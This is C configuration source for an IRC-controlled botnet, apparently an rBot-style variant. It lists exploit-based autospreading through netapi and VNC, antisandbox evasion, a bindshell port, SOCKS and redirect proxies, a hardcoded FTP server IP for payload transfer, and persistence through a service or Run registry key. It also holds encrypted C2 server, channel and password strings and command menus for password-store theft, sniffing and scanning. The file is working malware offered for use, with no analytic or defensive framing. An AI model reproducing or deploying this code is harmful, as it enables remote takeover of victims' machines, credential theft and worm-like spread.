/*

  Features:
			* antisandbox by Runningbon
			* netapi by ???
			* vnc autospread by NSA/OG with ftpip or built-in ftpd
			* vnc autosecure
			* netapi2 for win2000
			* wfpmod added
			* ipswitch imail
			* fake download/update/remove commands.

*/

char mutexhandle[]		= "\xFE\xFE";//*mutex handle

#ifndef _DEBUG
char botid[]			= "\x01";				//*bot id
#else
char botid[]			= "\xFE\xFE";
#endif

unsigned short ftpdport	= 2100;					//*ftpd port
BOOL staticftpd			= FALSE;				// always use ftpdport for the ftpd port
unsigned short sock4port= 8079;					// socks4 port
unsigned short redirport= 8000;					// redirect local port
unsigned short bindport = 6236;					//*bindshell port most of the exploits use

char prefix				= '!';					//*command prefix
char movepath[]			= "%windir%";			//*path to move to

#ifdef _DEBUG
char debug_log[]		= "C:\\system";
char debug_log_mode[]	= "w+";//"w+";
#endif

//--------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------
#ifndef NO_FTPIP
	/*
	this kind of solves the problem of lan boxes scanning outside their network, since the ftp transfer
	will always fail because its behind a router. same for non lan sp2 boxes with windows firewall.
	uses anonymous username.
	*/								
	char ftpip[] = "66.172.213.129";  //remote ftp server (make sure it allows anonymous access)
									 
	char ftpipport[] = "8";          //remote port

#endif //NO_FTPIP

	char filename[]			= "\x53\x45\x94\x57\x09\x91\xF9\x34\xE5\x69";

#ifndef NO_FCONNECT
	char cononstart[]		= "\x4C\x58\x8E\x54\x41\xCD\xF8\x3C\xF4\x6F\x0C\xC5\x5D\x6B\xC9\xBC\x91\x98\x6F\xC9\xC9\xB1\xFB\x34\xB8\x25\xBF\x90\x8C\x74\x3F\xFF\x99\xB2";
#endif

	char version[]			= "\x00";
#ifndef NO_SERVICE
	char servicename[]		= "\x66\x43\x8E\x04\x28\x87\xA5\x27\xF4\x6F\x1B";
	char servicedisplayname[]= "\x66\x43\x8E\x04\x28\x87\xA5\x27\xF4\x6F\x1B";
	char servicedesc[]		= "\x66\x43\x8E\x04\x28\x87\xA5\x27\xF4\x6F\x1B";
#else
	REGENT runkey = { HKEY_LOCAL_MACHINE, "\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93", "\x65\x60\xBD\x77" };
#endif

	char password[]			= "\x54\x5E\x9F\x49\x12\x97\xBA";
	
#ifdef _DEBUG
	char authhost1[] = "\x0E\x0D\xD0\x64\x51";
	char *authost[] = { authhost1 };//*!*@*
#else//nick!ident@host
	char authhost1[] = "\x0E\x0D\xD0\x64\x51";
	char *authost[] = { authhost1 };
#endif

#ifndef NO_VERSION_REPLY
	char versionlist1[] = "\x00";
	char *versionlist[] = { versionlist1 };
#endif

	SERVER servers[]={
		{
			"\x16\x1D\xCA\x0A\x4A\xD3\xEF\x7F\xAC\x3B\x4E\x84\x1F\x32",//server
			"",//pass
			6667,//port
			FALSE,//ssl
			"\x07\x5A\x94\x47",//mainchan
			"",//key
			"\x0F\x45\x82\x53",//modeonconn (+ix)
			"\x0F\x5F\x97\x4A\x0F\x97",//modeonjoin (+smntu)
			"\x07\x4D\x9E\x49",//exploitchan - #exp
			"\x07\x4D\x9E\x49",//sniffchan - #sniff
			"\x07\x4D\x9E\x49",//warnchan - #warn
		},
	};

#ifndef NO_MELT
	REGENT meltkey=	{ HKEY_LOCAL_MACHINE, "\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x39\xEE\x98\x97\x3D\x90\x42\xCC\xE9\x98\xD4\x9F\x78\xAC\xDE\x8A", "\x65\x60\xBD\x69" };
#endif

char main_title[]		= "main>";
char threads_title[]	= "threads>";
char process_title[]	= "process>";
char irc_title[]		= "irc>";
char sec_title[]		= "sec>";
char unsec_title[]		= "unsec>";
char scan_title[]		= "scan>";
char ftp_title[]		= "ftp>";
char file_title[]		= "file>";
char download_title[]	= "download>";
char update_title[]		= "update>";
char logic_title[]		= "logic>";
char mirc_title[]		= "mirc>";
char reg_title[]		= "reg>";
char pstore_title[]	    = "pstore>";
char netstatp_title[]	= "netstat>";
char sniffer_title[]	= "sniff>";
char tcp_title[]		= "tcp>";
char udp_title[]		= "udp>";
char speedtest_title[]	= "speedtest>";
char sock4_title[]		= "socks4>";
char redirect_title[]	= "redirect>";
char warn_title[]		= "warn>";



